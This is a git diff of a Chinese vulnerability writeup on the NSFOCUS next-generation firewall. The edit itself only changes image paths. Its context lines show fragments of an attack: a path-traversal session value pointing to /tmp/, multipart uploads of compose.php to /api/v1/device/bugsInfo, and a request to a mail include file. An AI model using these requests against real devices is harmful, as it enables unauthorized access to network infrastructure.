@@ -18,7 +18,7 @@ app="NSFOCUS-下一代防火墙"
 
 主页面
 
-![image-20230828162157873](images/image-20230828162157873.png)
+![image-20230828162157873](../.gitbook/assets/image-20230828162157873.png)
 
 出现漏洞的端口为 8081
 
@@ -35,7 +35,7 @@ lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
 --1d52ba2a11ad8a915eddab1a0e85acd9--
 ```
 
-![image-20230828162212745](images/image-20230828162212745.png)
+![image-20230828162212745](../.gitbook/assets/image-20230828162212745.png)
 
 ```
 POST /api/v1/device/bugsInfo HTTP/1.1
@@ -51,7 +51,7 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 --4803b59d015026999b45993b1245f0ef--
 ```
 
-![image-20230828162224796](images/image-20230828162224796.png)
+![image-20230828162224796](../.gitbook/assets/image-20230828162224796.png)
 
 ```
 POST /api/v1/device/bugsInfo HTTP/1.1
@@ -67,7 +67,7 @@ Content-Disposition: form-data; name="file"; filename="compose.php"
 --4803b59d015026999b45993b1245f0ef--
 ```
 
-![image-20230828162237233](images/image-20230828162237233.png)
+![image-20230828162237233](../.gitbook/assets/image-20230828162237233.png)
 
 ```
 POST /mail/include/header_main.php HTTP/1.1
